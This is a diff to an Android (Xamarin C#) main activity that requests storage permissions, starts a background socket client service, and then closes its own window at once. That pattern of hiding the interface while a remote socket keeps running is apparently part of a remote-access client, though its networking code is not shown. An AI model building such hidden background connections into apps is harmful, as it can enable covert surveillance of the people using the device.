@@ -1,12 +1,11 @@
-﻿using Android.App;
+﻿using ClientAndroid.Project;
+
+using Android.App;
 using Android.OS;
 using Android.Support.V7.App;
-using System.Threading;
-using ClientAndroid.Project;
 using Android;
 using Android.Content;
-using System;
-using Android.Widget;
+
 
 namespace ClientAndroid
 {
@@ -20,21 +19,16 @@ namespace ClientAndroid
             // Set our view from the "main" layout resource
             SetContentView(Resource.Layout.activity_main);
 
-            RequestPermissions(new string[] { 
-                Manifest.Permission.ReadExternalStorage, 
-                Manifest.Permission.WriteExternalStorage, 
-                Manifest.Permission.ReceiveBootCompleted }, 00);
-           
-            // Socket thread
-            new Thread(new ThreadStart(delegate
-            {
-                if (SocketClient.GetMainActivity != null) return;
-                SocketClient.GetMainActivity = this;
-                SocketClient.ReceiveHeader();
-            }))
-            { IsBackground = false }.Start();
+            // give permissions to read and write storage
+            RequestPermissions(new string[] {
+                Manifest.Permission.ReadExternalStorage,
+                Manifest.Permission.WriteExternalStorage }, 00);
 
-            base.OnBackPressed();
+            // Socket service
+            StartService(new Intent(this, typeof(SocketClient)));
+
+            // remove activity
+            this.FinishAffinity();
         }
     }
 }
